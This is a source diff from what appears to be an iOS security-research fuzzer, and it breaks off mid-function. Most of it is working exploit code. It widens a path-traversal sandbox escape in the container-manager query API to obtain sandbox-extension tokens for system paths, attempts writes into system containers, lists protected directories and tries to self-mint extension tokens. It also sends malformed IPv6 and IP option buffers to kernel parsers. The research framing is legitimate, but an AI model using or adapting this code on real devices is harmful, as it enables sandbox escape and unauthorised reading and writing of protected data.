@@ -23,6 +23,11 @@
 #include "bad_query.h"
 #include <spawn.h>
 #import <xpc/xpc.h>
+// Under -fobjc-arc xpc.h redefines xpc_release as [obj release], which ARC
+// forbids; the underlying C function is still exported, so drop the macro.
+#ifdef xpc_release
+#undef xpc_release
+#endif
 #include <mach-o/dyld.h>
 
 // bootstrap_* are exported by libsystem_kernel on iOS but have no SDK header.
@@ -43,6 +48,13 @@ enum { V_PING = 1, V_MAKE = 2, V_EXIT = 3 };
 #include <fcntl.h>
 #include <unistd.h>
 #include <stdarg.h>
+#include <sys/sysctl.h>
+#include <sys/ioctl.h>
+#include <ifaddrs.h>
+#include <net/if.h>
+#include <sys/sockio.h>
+#include <mach-o/loader.h>
+#include <mach-o/nlist.h>
 
 // exported by iOS IOKit binary but marked unavailable in SDK headers
 extern kern_return_t set_cf_property_ios(io_registry_entry_t entry,
@@ -24547,6 +24559,1348 @@ static void p_bq(void) {
     LOG("[bq] done");
 }
 
+// ---------------------------------------------------------------------------
+// V171 (p_bq2): the parameter space of the escape — §170 sampled one point.
+//
+// §170 proved the traversal works and read through it, but it sampled the
+// query at exactly one setting: class 7/13, part 3, two flag values, seven
+// paths, create=0. Every one of those is a knob, and each knob answers a
+// different question the journal has been guessing at:
+//
+//  - create=0 runs lstat *before* the query, so a sandbox denial of lstat
+//    comes back as -254 and is indistinguishable from a missing file. Roots
+//    swept with create=1 ask containermanagerd directly.
+//  - class routes the query to a different container class and, on the
+//    system route, a different daemon. §170 concluded "system daemon
+//    containers only" from two classes out of sixteen.
+//  - part selects the starting directory inside the container and therefore
+//    how deep the traversal must reach; parts 0..7 were never tried.
+//  - the descriptor's *type* was never exercised for write: read worked, so
+//    read-only was assumed. The extension's granted operations decide that,
+//    and "can write another container" is a different bug than "can read".
+//
+// Controls, in order (§144): the §170 point must reproduce first, then a
+// write inside our own container, then the write through the descriptor.
+// If control 1 fails, nothing below it means anything.
+// ---------------------------------------------------------------------------
+
+// Same machinery as fuzzer/bad_query.c, with class/flags/part lifted out as
+// parameters. Returns the same negative codes the vendored function does.
+static int64_t bq_custom(const char *path, int create, const char *grp,
+                         uint64_t cls, uint64_t flags, uint64_t part) {
+    if (!path || path[0] != '/') return -255;
+    if (!create) {
+        struct stat st;
+        if (lstat(path, &st) != 0) return -254;
+    }
+    void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+    if (!mgr) return -1;
+    typedef void *(*bq_create_t)(void);
+    typedef void (*bq_set_class_t)(void *, uint64_t);
+    typedef void (*bq_set_ids_t)(void *, xpc_object_t);
+    typedef void (*bq_set_flags_t)(void *, uint64_t);
+    typedef void (*bq_set_part_t)(void *, uint64_t);
+    typedef void (*bq_set_dom_t)(void *, const char *);
+    typedef void *(*bq_get_t)(void *);
+    typedef void (*bq_free_t)(void *);
+    typedef char *(*bq_token_t)(void *);
+    typedef int64_t (*bq_consume_t)(const char *);
+    bq_create_t q_create = (bq_create_t)dlsym(mgr, "container_query_create");
+    bq_set_class_t q_class = (bq_set_class_t)dlsym(mgr, "container_query_set_class");
+    bq_set_ids_t q_ids = (bq_set_ids_t)dlsym(mgr, "container_query_set_group_identifiers");
+    bq_set_flags_t q_flags = (bq_set_flags_t)dlsym(mgr, "container_query_operation_set_flags");
+    bq_set_part_t q_part = (bq_set_part_t)dlsym(mgr, "container_query_operation_set_part");
+    bq_set_dom_t q_dom = (bq_set_dom_t)dlsym(mgr, "container_query_operation_set_part_domain");
+    bq_get_t q_get = (bq_get_t)dlsym(mgr, "container_query_get_single_result");
+    bq_free_t q_free = (bq_free_t)dlsym(mgr, "container_query_free");
+    bq_token_t q_tok = (bq_token_t)dlsym(mgr, "container_copy_sandbox_token");
+    bq_consume_t consume = (bq_consume_t)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+    if (!q_create || !q_class || !q_ids || !q_flags || !q_part || !q_dom ||
+        !q_get || !q_free || !q_tok || !consume) {
+        dlclose(mgr);
+        return -1;
+    }
+    void *query = q_create();
+    if (!query) { dlclose(mgr); return -2; }
+    q_class(query, cls);
+    xpc_object_t ident = xpc_string_create(grp ? grp
+                                               : "systemgroup.com.apple.mobilegestaltcache");
+    q_ids(query, ident);
+    q_part(query, part);
+    // Depth mirrors bad_query.c: the AppGroup route climbs from one level
+    // deeper than the MobileGestalt SystemGroup route.
+    int depth = grp ? 10 : 8;
+    char *dom = NULL;
+    size_t need = strlen(path) + (size_t)depth * 3 + 4;
+    dom = malloc(need);
+    if (!dom) { q_free(query); dlclose(mgr); return -5; }
+    char *w = dom;
+    for (int i = 0; i < depth; i++) { memcpy(w, "../", 3); w += 3; }
+    memcpy(w, path, strlen(path) + 1);
+    q_dom(query, dom);
+    q_flags(query, flags);
+    void *result = q_get(query);
+    if (!result) {
+        free(dom); q_free(query); dlclose(mgr);
+        return -3;
+    }
+    char *token = q_tok(result);
+    if (!token) {
+        free(dom); q_free(query); dlclose(mgr);
+        return -4;
+    }
+    int64_t handle = consume(token);
+    free(token); free(dom); q_free(query);
+    dlclose(mgr);
+    return handle;
+}
+
+// Create+write+read-back+unlink probe. When a handle is passed the file is
+// created *through* the extension; without one this is the control that
+// proves the write path itself works in our own container.
+static void bq2_write(const char *dir, int64_t handle) {
+    (void)handle; // the extension grants path permission; open() is unchanged
+    char fp[600];
+    snprintf(fp, sizeof(fp), "%s/fz27_bq2_%d.tmp", dir, (int)getpid());
+    int fd = open(fp, O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    if (fd < 0) {
+        LOG("[bq2] WRITE %-46s -> open(O_CREAT) errno %d  (denied)", dir, errno);
+        fsync(fileno(stderr));
+        return;
+    }
+    ssize_t wr = write(fd, "fz27", 4);
+    fsync(fd);
+    close(fd);
+    // Reopen read-only: a read on the O_WRONLY fd would fail with EBADF and
+    // look like a broken write.
+    fd = open(fp, O_RDONLY);
+    char b[8] = {0};
+    ssize_t rd = fd >= 0 ? read(fd, b, 4) : -1;
+    if (fd >= 0) close(fd);
+    int un = unlink(fp);
+    LOG("[bq2] WRITE %-46s -> created, w=%zd r=%zd '%.4s' unlink=%d  *** WRITE OK ***",
+        dir, wr, rd, b, un);
+    fsync(fileno(stderr));
+}
+
+static void p_bq2(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    const uint64_t F_DEF = 0x0000008000000000ULL;
+    LOG("[bq2] v171 bad_query parameter space: write / roots / class / part / flags / symbols");
+
+    // ---- CONTROL 1: the §170 point itself must reproduce.
+    {
+        int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+        LOG("[bq2] CONTROL §170 point -> handle %lld%s",
+            (long long)h, h < 0 ? "  *** CONTROL FAILED — everything below is void ***" : "");
+        fsync(fileno(stderr));
+        if (h < 0) { LOG("[bq2] aborting on failed control"); LOG("[bq2] done"); return; }
+        bad_query_release(h);
+    }
+
+    // ---- CONTROL 2: a plain write inside our own container, no escape.
+    {
+        NSString *home = NSHomeDirectory();
+        char own[512];
+        snprintf(own, sizeof(own), "%s/Documents", home.fileSystemRepresentation);
+        LOG("[bq2] CONTROL 2 write in own container: %s", own);
+        bq2_write(own, -1);
+    }
+
+    // ---- CONTROL 3 + the untested half of the primitive: write through the
+    // escaped descriptor into a system container directory.
+    {
+        // Negative control FIRST: the same write with NO handle consumed.
+        // If this also succeeds the directory is simply writable and the
+        // escaped write below would prove nothing.
+        LOG("[bq2] NEGATIVE CONTROL write into Data/System with no handle");
+        bq2_write("/var/containers/Data/System", -1);
+
+        int64_t h = bq_custom("/var/containers/Data/System", 0, grp, 7, F_DEF, 3);
+        if (h < 0) {
+            LOG("[bq2] escaped write: no descriptor (%lld)", (long long)h);
+        } else {
+            LOG("[bq2] CONTROL 3 write through escaped descriptor into Data/System");
+            bq2_write("/var/containers/Data/System", h);
+            // and one level deeper, where the UUID directories live
+            DIR *d = opendir("/var/containers/Data/System/");
+            struct dirent *e;
+            while (d && (e = readdir(d))) {
+                if (e->d_name[0] == '.') continue;
+                if (strlen(e->d_name) < 30) continue; // UUID dirs are long
+                char sub[512];
+                snprintf(sub, sizeof(sub), "/var/containers/Data/System/%s", e->d_name);
+                LOG("[bq2] deeper write target: %s", sub);
+                bq2_write(sub, h);
+                break;
+            }
+            if (d) closedir(d);
+            bad_query_release(h);
+        }
+    }
+
+    // ---- Root sweep: create=0 (lstat gate included) vs create=1 (query
+    // asked directly). The delta between q0 and q1 is exactly the mask that
+    // -254 puts over sandbox-denied lstat.
+    static const char *roots[] = {
+        "/var/containers/Data/System",       // positive control
+        "/var/containers",                   // parent — §170 could not list parents
+        "/var/containers/Shared/SystemGroup",
+        "/var/mobile/Containers/Shared/AppGroup",
+        "/var/db",
+        "/private/var/db",
+        "/var/protected",
+        "/var/mobile/Library",
+        "/var/mobile/Library/Logs",
+        "/var/mobile/Library/Preferences",
+        "/var/root",
+        "/var/tmp",
+        "/var/preferences",
+        "/var/logs",
+        "/etc",
+        "/Library",
+        "/Library/Preferences",
+        "/System",
+        "/System/Library",
+        "/System/Library/LaunchDaemons",
+        "/usr",
+        "/usr/libexec",
+    };
+    for (unsigned i = 0; i < sizeof(roots) / sizeof(roots[0]); i++) {
+        struct stat st;
+        int le = (lstat(roots[i], &st) == 0) ? 0 : errno;
+        int64_t q0 = bq_custom(roots[i], 0, grp, 7, F_DEF, 3);
+        int64_t q1 = bq_custom(roots[i], 1, grp, 7, F_DEF, 3);
+        int64_t qn = bq_custom(roots[i], 1, NULL, 13, F_DEF, 3);
+        LOG("[bq2] root %-44s lstat=%s q0=%lld q1=%lld null=%lld",
+            roots[i], le ? "DENIED" : "ok", (long long)q0, (long long)q1, (long long)qn);
+        fsync(fileno(stderr));
+        int64_t best = q1 >= 0 ? q1 : (qn >= 0 ? qn : (q0 >= 0 ? q0 : -1));
+        if (best >= 0) {
+            char pp[560];
+            snprintf(pp, sizeof(pp), "%s/", roots[i]);
+            DIR *d = opendir(pp);
+            if (d) {
+                int n = 0;
+                struct dirent *e;
+                while ((e = readdir(d)) && n < 8) {
+                    if (e->d_name[0] == '.') continue;
+                    LOG("[bq2]    entry: %s", e->d_name);
+                    n++;
+                }
+                closedir(d);
+                LOG("[bq2]    ^ %d entries listed through the descriptor", n);
+            } else {
+                LOG("[bq2]    opendir errno %d", errno);
+            }
+        }
+        if (q0 >= 0) bad_query_release(q0);
+        if (q1 >= 0 && q1 != q0) bad_query_release(q1);
+        if (qn >= 0 && qn != q0 && qn != q1) bad_query_release(qn);
+    }
+
+    // ---- Class sweep: sixteen classes, both identifier routes, on the path
+    // §170 already opened. A class that also returns a handle is a different
+    // container class reachable by the same traversal — §170's conclusion
+    // ("system daemon containers only") was drawn from classes 7 and 13.
+    LOG("[bq2] class sweep, grp route (control class 7):");
+    for (uint64_t cls = 1; cls <= 16; cls++) {
+        int64_t h = bq_custom("/var/containers/Data/System", 1, grp, cls, F_DEF, 3);
+        LOG("[bq2]   class %-2llu -> %lld%s", (unsigned long long)cls, (long long)h,
+            (cls == 7 && h >= 0) ? "  (control class)" : (h >= 0 ? "  *** NEW CLASS ***" : ""));
+        fsync(fileno(stderr));
+        if (h >= 0) bad_query_release(h);
+    }
+    LOG("[bq2] class sweep, NULL route (control class 13):");
+    for (uint64_t cls = 1; cls <= 16; cls++) {
+        int64_t h = bq_custom("/var/containers/Data/System", 1, NULL, cls, F_DEF, 3);
+        LOG("[bq2]   class %-2llu -> %lld%s", (unsigned long long)cls, (long long)h,
+            (cls == 13 && h >= 0) ? "  (control class)" : (h >= 0 ? "  *** NEW CLASS ***" : ""));
+        fsync(fileno(stderr));
+        if (h >= 0) bad_query_release(h);
+    }
+
+    // ---- Part sweep: part is the starting directory inside the container,
+    // so it changes both which subtree the traversal escapes from and how
+    // many levels deep it must climb. Only part 3 (Library/Caches) was ever
+    // used — including by the upstream PoC.
+    LOG("[bq2] part sweep (depth fixed at the §170 value):");
+    for (uint64_t part = 0; part <= 7; part++) {
+        int64_t hg = bq_custom("/var/containers/Data/System", 1, grp, 7, F_DEF, part);
+        int64_t hn = bq_custom("/var/containers/Data/System", 1, NULL, 13, F_DEF, part);
+        LOG("[bq2]   part %llu -> grp %lld  null %lld%s",
+            (unsigned long long)part, (long long)hg, (long long)hn,
+            (part == 3 && hg >= 0) ? "  (control part)" : "");
+        fsync(fileno(stderr));
+        if (hg >= 0) bad_query_release(hg);
+        if (hn >= 0) bad_query_release(hn);
+    }
+
+    // ---- Flag sweep: the two known values plus neighbours. Flag bits pick
+    // the query semantics (which class kind, group vs personal…); §170 tested
+    // exactly two, both told to us by the PoC.
+    static const uint64_t flagset[] = {
+        0x0000008000000000ULL, 0x0000000800000000ULL,
+        0x0000000000000000ULL, 0x0000010000000000ULL,
+        0x0000004000000000ULL, 0x0000000400000000ULL,
+        0x0000000080000000ULL,
+    };
+    LOG("[bq2] flag sweep:");
+    for (unsigned i = 0; i < sizeof(flagset) / sizeof(flagset[0]); i++) {
+        int64_t h = bq_custom("/var/containers/Data/System", 1, grp, 7, flagset[i], 3);
+        LOG("[bq2]   flags 0x%016llx -> %lld", (unsigned long long)flagset[i], (long long)h);
+        fsync(fileno(stderr));
+        if (h >= 0) bad_query_release(h);
+    }
+
+    // ---- Ground truth on siblings: parse the dylib's own symbol table
+    // instead of guessing function names. §170 warned off filename guessing
+    // on a filesystem just gained; the same rule applies to an API surface
+    // we have only seen through two functions. If the on-disk file is not
+    // readable (dyld cache) that failure is logged as data too.
+    {
+        const char *dp = "/usr/lib/system/libsystem_containermanager.dylib";
+        int fd = open(dp, O_RDONLY);
+        if (fd < 0) {
+            LOG("[bq2] symtab: open %s -> errno %d", dp, errno);
+        } else {
+            struct stat st;
+            if (fstat(fd, &st) != 0 || st.st_size < 512) {
+                LOG("[bq2] symtab: fstat/size failed (%d)", errno);
+                close(fd);
+            } else {
+                size_t sz = (size_t)st.st_size;
+                uint8_t *m = mmap(NULL, sz, PROT_READ, MAP_FILE | MAP_PRIVATE, fd, 0);
+                close(fd);
+                if (m == MAP_FAILED) {
+                    LOG("[bq2] symtab: mmap errno %d", errno);
+                } else if (sz < sizeof(struct mach_header_64) ||
+                           *(uint32_t *)m != MH_MAGIC_64) {
+                    LOG("[bq2] symtab: not a 64-bit mach-o (magic 0x%08x, %zu bytes) — "
+                        "cache stub?", *(uint32_t *)m, sz);
+                    munmap(m, sz);
+                } else {
+                    struct mach_header_64 *mh = (struct mach_header_64 *)m;
+                    struct symtab_command *sym = NULL;
+                    uint8_t *lc = (uint8_t *)(mh + 1);
+                    for (uint32_t i = 0; i < mh->ncmds; i++) {
+                        struct load_command *cmd = (struct load_command *)lc;
+                        if (cmd->cmd == LC_SYMTAB) sym = (struct symtab_command *)cmd;
+                        lc += cmd->cmdsize;
+                    }
+                    if (!sym || (size_t)sym->stroff + sym->strsize > sz) {
+                        LOG("[bq2] symtab: no usable LC_SYMTAB");
+                    } else {
+                        char *strs = (char *)m + sym->stroff;
+                        int shown = 0, total = 0;
+                        for (uint32_t i = 0; i < sym->nsyms; i++) {
+                            // nlist_64 lives at symoff; bounds-check it
+                            if ((size_t)sym->symoff + (i + 1) * sizeof(struct nlist_64) > sz)
+                                break;
+                            struct nlist_64 *nl =
+                                (struct nlist_64 *)(m + sym->symoff) + i;
+                            if (nl->n_un.n_strx >= sym->strsize) continue;
+                            const char *nm = strs + nl->n_un.n_strx;
+                            if (!strstr(nm, "container_") &&
+                                !strstr(nm, "sandbox_extension")) continue;
+                            total++;
+                            if (shown < 120) { LOG("[bq2]   sym %s", nm); shown++; }
+                        }
+                        LOG("[bq2] symtab: %d container_/sandbox_ exports, %d shown",
+                            total, shown);
+                    }
+                    munmap(m, sz);
+                }
+            }
+        }
+        fsync(fileno(stderr));
+    }
+
+    // ---- Which sibling entry points resolve? dlsym tells existence without
+    // calling anything — the datum the name list above cannot give for the
+    // functions the symbol dump failed to reach.
+    {
+        static const char *cands[] = {
+            "container_query_operation_set_part_domain",
+            "container_query_set_part_domain",
+            "container_query_set_part",
+            "container_query_set_url",
+            "container_query_set_path",
+            "container_query_set_scope",
+            "container_query_set_current_holder",
+            "container_query_set_identifiers",
+            "container_query_set_group_identifiers",
+            "container_query_set_flags",
+            "container_query_operation_set_flags",
+            "container_query_operation_set_part",
+            "container_create_or_lookup_app_group_path_by_app_group_identifier",
+            "container_create_or_lookup_system_group_path_by_system_group_identifier",
+            "container_copy_sandbox_token",
+            "container_copy_external_token_for_path",
+            "container_sandbox_extension_copy_token",
+            "sandbox_extension_issue_file",
+            "sandbox_extension_issue_file_to_process",
+            "sandbox_extension_issue_generic",
+            "sandbox_extension_issue_mach",
+        };
+        void *mgr = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW | RTLD_LOCAL);
+        for (unsigned i = 0; i < sizeof(cands) / sizeof(cands[0]); i++) {
+            void *p1 = dlsym(mgr ? mgr : RTLD_DEFAULT, cands[i]);
+            void *p2 = dlsym(RTLD_DEFAULT, cands[i]);
+            LOG("[bq2]   dlsym %-68s img=%p global=%p", cands[i], p1, p2);
+        }
+        if (mgr) dlclose(mgr);
+        fsync(fileno(stderr));
+    }
+
+    // ---- LAST, and only because a wrong signature here would crash this
+    // process rather than measure anything: sandbox_extension_issue_file is
+    // the direction of the whole escape — tokens are supposed to be minted
+    // only by privileged daemons, and this would be minting one ourselves.
+    // The first run passed type=NULL and got EINVAL(22), which is a *format*
+    // complaint, not a policy one (§165's same trap with 13-byte IP_OPTIONS):
+    // a NULL type proves nothing. So: control first with a path we already
+    // own (must issue), then the interesting path, with real type strings.
+    {
+        typedef char *(*issue_t)(const char *, const char *, uint64_t);
+        typedef int64_t (*consume_t)(const char *);
+        issue_t issue = (issue_t)dlsym(RTLD_DEFAULT, "sandbox_extension_issue_file");
+        consume_t consume = (consume_t)dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
+        LOG("[bq2] issue_file=%p consume=%p", (void *)issue, (void *)consume);
+        fsync(fileno(stderr));
+        if (issue && consume) {
+            static const char *types[] = {
+                "file-read-data", "file-write-data", "file-read-metadata",
+                "file-issue", "file-ioctl",
+            };
+            NSString *home = NSHomeDirectory();
+            char own[512];
+            snprintf(own, sizeof(own), "%s/Documents", home.fileSystemRepresentation);
+            for (unsigned i = 0; i < sizeof(types) / sizeof(types[0]); i++) {
+                // CONTROL: our own path must mint (issue is allowed to self)
+                char *tok0 = issue(types[i], own, 0);
+                LOG("[bq2] issue '%s' OWN  -> %s", types[i],
+                    tok0 ? "TOKEN ***" : "NULL");
+                fsync(fileno(stderr));
+                if (tok0) {
+                    int64_t h0 = consume(tok0);
+                    LOG("[bq2]   consumed own-token -> handle %lld%s",
+                        (long long)h0, h0 >= 0 ? "  (issue works for self)" : "");
+                    if (h0 >= 0) bad_query_release(h0);
+                }
+                // THE TEST: same call aimed outside our sandbox
+                char *tok = issue(types[i], "/var/db", 0);
+                LOG("[bq2] issue '%s' /var/db -> %s", types[i],
+                    tok ? "TOKEN ISSUED *** SELF-MINT OUTSIDE SANDBOX ***" : "NULL");
+                fsync(fileno(stderr));
+                if (tok) {
+                    int64_t h = consume(tok);
+                    LOG("[bq2]   consumed outside-token -> handle %lld", (long long)h);
+                    if (h >= 0) bad_query_release(h);
+                }
+            }
+            // and the escaped path itself: if issue accepts /var/db it is
+            // likely to accept Data/System too
+            char *t2 = issue("file-write-data", "/var/containers/Data/System", 0);
+            LOG("[bq2] issue 'file-write-data' Data/System -> %s",
+                t2 ? "TOKEN ISSUED ***" : "NULL");
+            fsync(fileno(stderr));
+            if (t2) {
+                int64_t h = consume(t2);
+                LOG("[bq2]   consumed Data/System token -> handle %lld", (long long)h);
+                if (h >= 0) bad_query_release(h);
+            }
+        }
+    }
+    LOG("[bq2] done");
+}
+
+// ---------------------------------------------------------------------------
+// V171 (p_netv6): the kernel network surface §146 could not reach, asked
+// through the sockets an app is actually allowed to create.
+//
+// §146's answer was 0 of 132 Mach names — the daemon side is closed from a
+// sandbox. The kernel side has never been swept with the same rigor: §163
+// established that raw sockets are refused (EPERM) and that datagram loops
+// work, and then stopped. Between those two facts sit the paths a permitted
+// socket still exposes to kernel parsers:
+//
+//  - IPv6 extension headers: hop-by-hop, routing, destination options are
+//    parsed by ip6_* in-kernel on *egress* even from a plain UDP socket.
+//    The option-length byte is attacker-controlled and historically where
+//    length bugs live. On Darwin setsockopt is where the options are
+//    validated — so the refusal, if it is one, is itself the answer.
+//  - SCTP / MPTCP / UDPLITE: three transports with separate kernel stacks
+//    (sctp_usrreq, tcp_usrreq's MPTCP branch, udplite). Whether the sockets
+//    can even be *created* on iOS is unmeasured; EPROTONOSUPPORT vs EPERM
+//    distinguishes "compiled out" from "policy".
+//  - sendmsg cmsg: control messages take a second parser path (ip_setpktopts
+//    and friends) separate from setsockopt, and IP_RETOPTS via cmsg is the
+//    one route to IP options that does not go through the setsockopt that
+//    §165 watched refuse with EINVAL.
+//  - sysctl writes: a denominator question. Every write attempted is logged
+//    with its errno, and the *reads* of the same names are the control that
+//    proves the name was resolved at all — a write refused on a name that
+//    cannot be read would mean nothing.
+//  - ioctl: same shape. SIOCG* reads are the control, SIOCS* writes are the
+//    test, and the write is issued with the value just read so that success
+//    changes nothing.
+// ---------------------------------------------------------------------------
+static void p_netv6(void) {
+    LOG("[net6] v171 IPv6 ext-hdr / SCTP / MPTCP / cmsg / sysctl-write / ioctl-write");
+
+    // ---- CONTROL: sysctl reads resolve and a loop datagram round-trips.
+    {
+        int v = 0;
+        size_t l = sizeof(v);
+        int rc = sysctlbyname("kern.maxproc", &v, &l, NULL, 0);
+        LOG("[net6] CONTROL sysctl read kern.maxproc -> rc %d v %d errno %d", rc, v,
+            rc < 0 ? errno : 0);
+        int s = socket(AF_INET, SOCK_DGRAM, 0);
+        struct sockaddr_in a = {0};
+        a.sin_len = sizeof(a); a.sin_family = AF_INET;
+        a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        int b = bind(s, (struct sockaddr *)&a, sizeof(a));
+        socklen_t sl = sizeof(a);
+        getsockname(s, (struct sockaddr *)&a, &sl);
+        struct sockaddr_in me = a;
+        ssize_t sent = sendto(s, "ctl", 3, 0, (struct sockaddr *)&me, sizeof(me));
+        struct timeval tv = {0, 300000};
+        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+        char rb[8] = {0};
+        ssize_t rd = recv(s, rb, sizeof(rb), 0);
+        LOG("[net6] CONTROL loop datagram bind=%d send=%zd recv=%zd ('%.3s')",
+            b, sent, rd, rb);
+        close(s);
+        if (rc != 0 || rd != 3)
+            LOG("[net6] *** CONTROL FAILED — refusals below may be instrumentation ***");
+        fsync(fileno(stderr));
+    }
+
+    // ---- IPv6 extension headers. Each buffer is well-formed first, then a
+    // malformed variant of the same option: the length byte disagrees with
+    // the buffer we hand over, which is the classic parser-fooling shape.
+    {
+        int v6 = socket(AF_INET6, SOCK_DGRAM, 0);
+        LOG("[net6] ipv6 dgram socket -> %d errno %d", v6, v6 < 0 ? errno : 0);
+        if (v6 >= 0) {
+            // hop-by-hop: nxt, len (8-octet units minus 1), options
+            uint8_t hbh_ok[8]  = { IPPROTO_NONE, 0, 0x01, 0x04, 0, 0, 0, 0 };
+            uint8_t hbh_bad[8] = { IPPROTO_NONE, 0xff, 0x01, 0x04, 0, 0, 0, 0 };
+            int rc;
+            rc = setsockopt(v6, IPPROTO_IPV6, IPV6_2292HOPOPTS, hbh_ok, sizeof(hbh_ok));
+            LOG("[net6] IPV6_2292HOPOPTS well-formed -> %d errno %d", rc, rc < 0 ? errno : 0);
+            rc = setsockopt(v6, IPPROTO_IPV6, IPV6_2292HOPOPTS, hbh_bad, sizeof(hbh_bad));
+            LOG("[net6] IPV6_2292HOPOPTS len=0xff     -> %d errno %d", rc, rc < 0 ? errno : 0);
+            rc = setsockopt(v6, IPPROTO_IPV6, IPV6_2292HOPOPTS, hbh_ok, 6);
+            LOG("[net6] IPV6_2292HOPOPTS len=6 (not 8n) -> %d errno %d", rc, rc < 0 ? errno : 0);
+
+            // destination options, same two shapes
+            rc = setsockopt(v6, IPPROTO_IPV6, IPV6_2292DSTOPTS, hbh_ok, sizeof(hbh_ok));
+            LOG("[net6] IPV6_2292DSTOPTS well-formed -> %d errno %d", rc, rc < 0 ? errno : 0);
+            rc = setsockopt(v6, IPPROTO_IPV6, IPV6_2292DSTOPTS, hbh_bad, sizeof(hbh_bad));
+            LOG("[net6] IPV6_2292DSTOPTS len=0xff     -> %d errno %d", rc, rc < 0 ? errno : 0);
+
+            // routing header: type 0 (deprecated, source-routing class of bug)
+            // and type 2 (RH2, mobility). nxt, len, type, segsleft, reserved,
+            // one 16-byte address.
+            uint8_t rt0[24] = { IPPROTO_NONE, 2, 0, 1, 0,0,0,0,
+                                0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0 };
+            uint8_t rt2[24] = { IPPROTO_NONE, 2, 2, 1, 0,0,0,0,
+                                0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0 };
+            uint8_t rt_bad[24] = { IPPROTO_NONE, 0xff, 0, 1, 0,0,0,0,
+                                   0,0,0,0,0,0,0,0, 0,0,0,0,0,0,0,0 };
+            rc = setsockopt(v6, IPPROTO_IPV6, IPV6_2292RTHDR, rt0, sizeof(rt0));
+            LOG("[net6] IPV6_2292RTHDR type 0 -> %d errno %d", rc, rc < 0 ? errno : 0);
+            rc = setsockopt(v6, IPPROTO_IPV6, IPV6_2292RTHDR, rt2, sizeof(rt2));
+            LOG("[net6] IPV6_2292RTHDR type 2 -> %d errno %d", rc, rc < 0 ? errno : 0);
+            rc = setsockopt(v6, IPPROTO_IPV6, IPV6_2292RTHDR, rt_bad, sizeof(rt_bad));
+            LOG("[net6] IPV6_2292RTHDR len=0xff -> %d errno %d", rc, rc < 0 ? errno : 0);
+
+            // If any option was accepted, egress has to parse it: send to a
+            // closed loopback port so the kernel walks the output path.
+            if (setsockopt(v6, IPPROTO_IPV6, IPV6_2292HOPOPTS, hbh_ok, sizeof(hbh_ok)) == 0) {
+                struct sockaddr_in6 d = {0};
+                d.sin6_len = sizeof(d); d.sin6_family = AF_INET6;
+                d.sin6_addr = in6addr_loopback; d.sin6_port = htons(1);
+                ssize_t s6 = sendto(v6, "x", 1, 0, (struct sockaddr *)&d, sizeof(d));
+                LOG("[net6] egress with accepted HBH -> send %zd errno %d", s6,
+                    s6 < 0 ? errno : 0);
+            }
+            close(v6);
+        }
+        fsync(fileno(stderr));
+    }
+
+    // ---- Transports: can the socket be created at all? EPROTONOSUPPORT
+    // means the stack is not in this kernel; EPERM means policy; anything
+    // else means the parser is reachable.
+    {
+        static const struct { int proto; const char *name; } protos[] = {
+            { 132, "SCTP" },
+            { 136, "UDPLITE" },
+            { 262, "MPTCP" },
+            { 255, "RAW(255) — control, §163 said EPERM" },
+        };
+        for (unsigned i = 0; i < sizeof(protos) / sizeof(protos[0]); i++) {
+            int s1 = socket(AF_INET, SOCK_STREAM, protos[i].proto);
+            int e1 = s1 < 0 ? errno : 0;
+            int s2 = socket(AF_INET, SOCK_DGRAM, protos[i].proto);
+            int e2 = s2 < 0 ? errno : 0;
+            int s3 = socket(AF_INET, SOCK_SEQPACKET, protos[i].proto);
+            int e3 = s3 < 0 ? errno : 0;
+            LOG("[net6] proto %-3d %-34s stream=%d(%d) dgram=%d(%d) seq=%d(%d)",
+                protos[i].proto, protos[i].name, s1, e1, s2, e2, s3, e3);
+            if (s1 >= 0) close(s1);
+            if (s2 >= 0) close(s2);
+            if (s3 >= 0) close(s3);
+        }
+        fsync(fileno(stderr));
+    }
+
+    // ---- IP_OPTIONS revisited (§165 said EINVAL — but on a 13-byte buffer).
+    // RFC 791 options must be a multiple of four bytes and ≤ 40, so EINVAL
+    // there could have been shape rather than policy. Re-ask with legal
+    // lengths and with a legal LSRR: if these go through, the option parser
+    // is reachable after all and §165's conclusion was a detector artifact.
+    {
+        int s = socket(AF_INET, SOCK_DGRAM, 0);
+        struct {
+            const char *what;
+            uint8_t b[40];
+            int n;
+        } cases[6];
+        memset(cases, 0, sizeof(cases));
+        // 4 NOPs — legal, does nothing
+        memset(cases[0].b, 0x01, 4); cases[0].n = 4;
+        cases[0].what = "4x NOP (legal trivial)";
+        // EOL then padding to 8
+        cases[1].n = 8; cases[1].what = "EOL + 7 pad (legal)";
+        // LSRR, one address: type 131, len 8 (3 + 4 + 1 pad), ptr 4
+        cases[2].b[0] = 0x83; cases[2].b[1] = 8; cases[2].b[2] = 4;
+        cases[2].b[3] = 127; cases[2].b[4] = 0; cases[2].b[5] = 0;
+        cases[2].b[6] = 1; cases[2].b[7] = 0x01;
+        cases[2].n = 8; cases[2].what = "LSRR 1 hop (legal shape)";
+        // LSRR with length byte that overshoots the buffer — real parser test
+        cases[3].b[0] = 0x83; cases[3].b[1] = 40; cases[3].b[2] = 4;
+        cases[3].n = 8; cases[3].what = "LSRR len=40 in 8B buffer";
+        // unknown option type 0x1f with legal framing
+        cases[4].b[0] = 0x1f; cases[4].b[1] = 4; cases[4].n = 4;
+        cases[4].what = "unknown option type 0x1f";
+        // security option with bad length framing
+        cases[5].b[0] = 0x82; cases[5].b[1] = 0; cases[5].n = 8;
+        cases[5].what = "security opt len=0 (loop candidate)";
+        for (int i = 0; i < 6; i++) {
+            int rc = setsockopt(s, IPPROTO_IP, IP_OPTIONS, cases[i].b,
+                                (socklen_t)cases[i].n);
+            LOG("[net6] setsockopt IP_OPTIONS %-26s n=%d -> rc %d errno %d%s",
+                cases[i].what, cases[i].n, rc, rc < 0 ? errno : 0,
+                rc == 0 ? "  *** ACCEPTED ***" : "");
+            if (rc == 0) {
+                // If accepted, egress must carry them: send to a closed port
